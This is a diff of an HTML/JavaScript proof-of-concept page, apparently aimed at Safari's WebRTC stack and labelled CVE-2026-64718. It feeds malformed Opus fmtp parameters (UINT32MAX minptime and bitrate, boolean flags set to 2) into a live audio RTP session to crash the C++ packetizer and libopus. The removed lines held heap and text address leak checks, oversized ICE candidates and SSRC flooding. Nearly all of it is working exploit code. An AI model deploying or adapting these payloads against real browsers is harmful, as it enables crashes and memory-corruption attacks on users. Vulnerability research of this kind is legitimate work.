@@ -1,7 +1,7 @@
 <!doctype html><html><head>
 <meta charset=utf8>
 <meta name=viewport content="width=device-width,initial-scale=1">
-<title>WebRTC OOB Escalation</title>
+<title>WebRTC Audio Crash</title>
 <style>
 body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px;max-width:520px}
 button{background:#ff453a;color:#fff;border:none;padding:10px 18px;border-radius:6px;font-size:12px;cursor:pointer;margin:3px}
@@ -16,12 +16,10 @@ Running: <span id="orig"></span> | RTC: <span id="rtcst">...</span>
 </div>
 <div>
 <button onclick="runAll()">Run All</button>
-<button class="s" onclick="runClockRate()">clockRate=0</button>
-<button class="s" onclick="runChannels()">channels=0</button>
-<button class="s" onclick="runICEComp()">ICE comp=65535</button>
-<button class="s" onclick="runFoundation()">Found=256</button>
-<button class="s" onclick="runFmtpOvfl()">fmtp overflow</button>
-<button class="s" onclick="runSSRC()">SSRC spam</button>
+<button class="s" onclick="runMinptime()">💀 minptime=UMAX</button>
+<button class="s" onclick="runBooleans()">💀 cbr/fec/dtx=2</button>
+<button class="s" onclick="runBitrate()">💀 bitrate=UMAX</button>
+<button class="s" onclick="runCombined()">💀 All Combined</button>
 <button class="cp" onclick="copyLog()">Copy</button>
 <button class="s" onclick="clearLog()">Clear</button>
 </div>
@@ -32,131 +30,137 @@ document.getElementById('orig').textContent=location.origin;
 var rtcOk=typeof RTCPeerConnection!=='undefined';
 document.getElementById('rtcst').textContent=rtcOk?'OK':'BLOCKED';
 document.getElementById('rtcst').style.color=rtcOk?'#32d74b':'#ff453a';
-var HEAP_LO=0x104000000,HEAP_HI=0x400000000,TEXT_LO=0x198ce6000,TEXT_HI=0x1b37db000,WK_LO=0x19e3cb000,WK_HI=0x1fba00000;
-var pb=new ArrayBuffer(8),pf=new Float64Array(pb),pu=new Uint32Array(pb);
+
 function w(s,c){var d=document.getElementById('o'),e=document.createElement('span');if(c)e.className=c;e.textContent=new Date().toTimeString().slice(0,8)+' '+s+'\n';d.appendChild(e);d.scrollTop=d.scrollHeight;}
 function ok(s){w('[+] '+s,'g')}function info(s){w('[*] '+s,'d')}function warn(s){w('[~] '+s,'a')}
-function hit(s){w('[!!!] '+s,'r');var h=document.getElementById('hit');h.style.display='block';h.textContent+='CRASH/LEAK: '+s+'\n';}
+function hit(s){w('[!!!] '+s,'r');var h=document.getElementById('hit');h.style.display='block';h.textContent+='HIT: '+s+'\n';}
 function clearLog(){document.getElementById('o').innerHTML='';document.getElementById('hit').style.display='none';document.getElementById('hit').textContent='';}
 function copyLog(){navigator.clipboard.writeText(document.getElementById('o').textContent).then(function(){});}
-function chkReal(v,lbl){if(typeof v!=='number'||isNaN(v)||!isFinite(v)||v===0)return false;pf[0]=v;var lo=pu[0],hi=pu[1],a=hi*4294967296+lo;if(lo<0x100000&&hi<0x100000)return false;if(a>=TEXT_LO&&a<=TEXT_HI){hit('JSC TEXT ('+lbl+'): 0x'+a.toString(16));return true;}if(a>=WK_LO&&a<=WK_HI){hit('WK ('+lbl+'): 0x'+a.toString(16));return true;}if(a>=HEAP_LO&&a<=HEAP_HI){hit('HEAP ('+lbl+'): 0x'+a.toString(16));return true;}return false;}
-function mkPC(){return new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});}
-async function tryConnect(sdpFn,label){
+
+// Make silent audio track using AudioContext oscillator
+function makeSilentTrack(){
+  var ctx=new AudioContext();
+  var osc=ctx.createOscillator();
+  var dst=ctx.createMediaStreamDestination();
+  // Very low volume — just enough to trigger RTP packetizer
+  var gain=ctx.createGain();
+  gain.gain.value=0.001;
+  osc.connect(gain);
+  gain.connect(dst);
+  osc.start();
+  return{track:dst.stream.getAudioTracks()[0],ctx:ctx,osc:osc};
+}
+
+async function connectWithAudio(fmtpStr,label){
+  var audio=makeSilentTrack();
   var p1=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
   var p2=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+
   p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
   p2.onicecandidate=function(e){if(e.candidate)p1.addIceCandidate(e.candidate).catch(function(){});};
+
+  // Add real audio track — this forces C++ RTP packetizer to actually run
+  p1.addTrack(audio.track,new MediaStream([audio.track]));
+
+  var offer=await p1.createOffer();
+  // Inject extreme fmtp
+  var modSDP=offer.sdp.replace('minptime=10;useinbandfec=1',fmtpStr);
+  offer={type:'offer',sdp:modSDP};
+
   try{
-    p1.addTransceiver('audio',{direction:'sendrecv'});
-    var offer=await p1.createOffer();
-    if(sdpFn)offer={type:'offer',sdp:sdpFn(offer.sdp)};
     await p1.setLocalDescription(offer);
-    try{
-      await p2.setRemoteDescription(offer);
-      var ans=await p2.createAnswer();
-      await p2.setLocalDescription(ans);
-      await p1.setRemoteDescription(ans);
-      ok(label+': SDP OK — waiting for ICE...');
-    }catch(e){info(label+': rejected: '+e.message.slice(0,60));p1.close();p2.close();return;}
-  }catch(e){info(label+': fail: '+e.message.slice(0,40));p1.close();p2.close();return;}
+  }catch(e){info(label+': setLocal fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
+
+  try{
+    await p2.setRemoteDescription(offer);
+    var ans=await p2.createAnswer();
+    await p2.setLocalDescription(ans);
+    await p1.setRemoteDescription(ans);
+  }catch(e){info(label+': exchange fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
+
+  ok(label+': SDP+audio exchange OK — waiting for connection+RTP...');
+
   await new Promise(function(resolve){
-    var t=setTimeout(function(){info(label+': timeout');p1.close();p2.close();resolve();},5000);
+    var t=setTimeout(function(){
+      info(label+': 8s timeout — no crash during RTP');
+      audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
+    },8000);
     p1.onconnectionstatechange=function(){
-      if(p1.connectionState==='connected'){clearTimeout(t);ok(label+': CONNECTED — C++ processing extreme SDP!');setTimeout(function(){p1.close();p2.close();resolve();},800);}
-      if(p1.connectionState==='failed'){clearTimeout(t);info(label+': ICE failed');p1.close();p2.close();resolve();}
+      if(p1.connectionState==='connected'){
+        ok(label+': CONNECTED — audio RTP flowing with extreme fmtp!');
+        warn(label+': C++ RTP packetizer running with fmtp: '+fmtpStr);
+        // Keep running for 3s to stress the packetizer
+        setTimeout(function(){
+          ok(label+': survived 3s of RTP with extreme fmtp');
+          clearTimeout(t);
+          audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
+        },3000);
+      }
+      if(p1.connectionState==='failed'){
+        clearTimeout(t);info(label+': ICE failed');
+        audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
+      }
     };
   });
 }
-async function runClockRate(){
-  w('\n=== clockRate=0 RTP crash ===\n','g');if(!rtcOk)return;
-  await tryConnect(function(s){return s.replace(/opus\/48000/g,'opus/0');},'clockRate=0');
-  await tryConnect(function(s){return s.replace(/opus\/48000/g,'opus/1');},'clockRate=1');
-  await tryConnect(function(s){return s.replace(/opus\/48000/g,'opus/8');},'clockRate=8');
-  ok('clockRate done — check Analytics');
+
+// minptime=UINT32MAX: buf = 48000 * 4294967295 / 1000 = ~206GB overflow
+async function runMinptime(){
+  w('\n=== minptime=UINT32MAX — RTP buffer overflow ===\n','g');
+  if(!rtcOk)return;
+  info('minptime=4294967295ms → RTP buf=206GB → integer overflow or crash');
+  await connectWithAudio('minptime=4294967295','minptime=UMAX');
+  info('minptime=0 test:');
+  await connectWithAudio('minptime=0','minptime=0');
+  ok('minptime done — check Analytics');
 }
-async function runChannels(){
-  w('\n=== channels=0 ===\n','g');if(!rtcOk)return;
-  await tryConnect(function(s){return s.replace(/opus\/48000\/2/g,'opus/48000/0');},'channels=0');
-  await tryConnect(function(s){return s.replace(/opus\/48000\/2/g,'opus/48000/1');},'channels=1');
-  ok('channels done');
+
+// cbr=2, useinbandfec=2, usedtx=2: boolean params with illegal values
+async function runBooleans(){
+  w('\n=== Boolean params = 2 ===\n','g');
+  if(!rtcOk)return;
+  info('OPUS_SET_INBAND_FEC(2), OPUS_SET_DTX(2), OPUS_SET_CBR(2)');
+  info('libopus expects 0 or 1 — value 2 may cause undefined behavior');
+  await connectWithAudio('cbr=2;useinbandfec=2;usedtx=2','booleans=2');
+  await connectWithAudio('useinbandfec=2','fec=2');
+  await connectWithAudio('usedtx=2','dtx=2');
+  await connectWithAudio('cbr=2','cbr=2');
+  ok('booleans done — check Analytics');
 }
-async function runICEComp(){
-  w('\n=== ICE component OOB ===\n','g');if(!rtcOk)return;
-  var p1=mkPC(),p2=mkPC();
-  p1.addTransceiver('audio');
-  p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
-  var offer=await p1.createOffer();
-  await p1.setLocalDescription(offer);
-  await p2.setRemoteDescription(offer);
-  var ans=await p2.createAnswer();
-  await p2.setLocalDescription(ans);
-  await p1.setRemoteDescription(ans);
-  await new Promise(function(r){setTimeout(r,500);});
-  var comps=[2,100,255,1000,32767,65534,65535];
-  for(var i=0;i<comps.length;i++){
-    for(var j=0;j<10;j++){
-      try{await p2.addIceCandidate({candidate:'candidate:'+j+' '+comps[i]+' UDP '+(Math.floor(Math.random()*0xFFFFFFF)+1)+' 192.168.'+j+'.'+i+' '+(9000+j)+' typ host',sdpMid:'0',sdpMLineIndex:0});}catch(e){}
-    }
-    info('ICE component='+comps[i]+' x10 injected');
-  }
-  await new Promise(function(r){setTimeout(r,500);});
-  ok('ICE component done — check Analytics');
-  p1.close();p2.close();
+
+// maxaveragebitrate=UINT32MAX: OPUS_SET_BITRATE(4294967295)
+async function runBitrate(){
+  w('\n=== maxaveragebitrate=UINT32MAX ===\n','g');
+  if(!rtcOk)return;
+  info('OPUS_SET_BITRATE(4294967295) — 4.29 Gbps target bitrate');
+  info('libopus bitrate range: 500-512000 bps — overflow likely');
+  await connectWithAudio('maxaveragebitrate=4294967295','bitrate=UMAX');
+  await connectWithAudio('maxplaybackrate=4294967295','playbackrate=UMAX');
+  await connectWithAudio('ptime=4294967295','ptime=UMAX');
+  ok('bitrate done — check Analytics');
 }
-async function runFoundation(){
-  w('\n=== Foundation overflow ===\n','g');if(!rtcOk)return;
-  var p1=mkPC(),p2=mkPC();
-  p1.addTransceiver('audio');
-  p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
-  var offer=await p1.createOffer();
-  await p1.setLocalDescription(offer);
-  await p2.setRemoteDescription(offer);
-  var ans=await p2.createAnswer();
-  await p2.setLocalDescription(ans);
-  await p1.setRemoteDescription(ans);
-  await new Promise(function(r){setTimeout(r,300);});
-  var lens=[32,33,64,128,256,512,1024,4096];
-  for(var i=0;i<lens.length;i++){
-    try{
-      await p2.addIceCandidate({candidate:'candidate:'+('A'.repeat(lens[i]))+' 1 UDP 2130706431 127.0.0.1 '+(9000+i)+' typ host',sdpMid:'0',sdpMLineIndex:0});
-      warn('Foundation['+lens[i]+']: ACCEPTED');
-    }catch(e){info('Foundation['+lens[i]+']: '+e.name);}
-  }
-  ok('Foundation done — check Analytics');
-  p1.close();p2.close();
+
+// Combined: all extreme values at once
+async function runCombined(){
+  w('\n=== ALL COMBINED — maximum stress ===\n','g');
+  if(!rtcOk)return;
+  info('All extreme values simultaneously');
+  var combined='minptime=4294967295;maxaveragebitrate=4294967295;maxplaybackrate=4294967295;cbr=2;useinbandfec=2;usedtx=2;ptime=4294967295';
+  await connectWithAudio(combined,'ALL_COMBINED');
+  ok('combined done — check Analytics');
 }
-async function runFmtpOvfl(){
-  w('\n=== fmtp overflow ===\n','g');if(!rtcOk)return;
-  var fmtps=['minptime=4294967295;maxaveragebitrate=4294967295','maxplaybackrate=4294967295','maxaveragebitrate=4294967295','minptime=0','ptime=4294967295','stereo=2','cbr=2','useinbandfec=2','usedtx=2'];
-  for(var i=0;i<fmtps.length;i++){
-    var f=fmtps[i];
-    await tryConnect(function(s){return s.replace('minptime=10;useinbandfec=1',f);},'fmtp='+f.slice(0,25));
-    await new Promise(function(r){setTimeout(r,80);});
-  }
-  ok('fmtp done — check Analytics');
-}
-async function runSSRC(){
-  w('\n=== SSRC spam ===\n','g');if(!rtcOk)return;
-  await tryConnect(function(sdp){
-    var x='';
-    for(var i=0;i<100;i++)x+='a=ssrc:'+(1000+i)+' cname:s'+i+'\r\n';
-    var ids=Array.from({length:100},function(_,i){return (1000+i).toString();}).join(' ');
-    x+='a=ssrc-group:FID '+ids+'\r\n';
-    return sdp.replace('a=ssrc:1 cname:x',x+'a=ssrc:1 cname:x');
-  },'100 SSRCs');
-  ok('SSRC done — check Analytics');
-}
+
 async function runAll(){
   clearLog();
-  w('=== WebRTC OOB Escalation - CVE-2026-64718 ===\n','g');
+  w('=== WebRTC Audio RTP Crash — CVE-2026-64718 ===\n','g');
+  w('[*] Sending REAL AUDIO with extreme fmtp values\n','d');
+  w('[*] C++ RTP packetizer + libopus will process these\n','d');
   if(!rtcOk){w('[!!!] RTC BLOCKED\n','r');return;}
-  await runClockRate();
-  await runChannels();
-  await runICEComp();
-  await runFoundation();
-  await runFmtpOvfl();
-  await runSSRC();
-  w('\nDone. Check Safari Analytics.\n','g');
+  await runMinptime();
+  await runBooleans();
+  await runBitrate();
+  await runCombined();
+  w('\nDone. Check Safari Analytics for crashes.\n','g');
 }
 </script>
 </body></html>
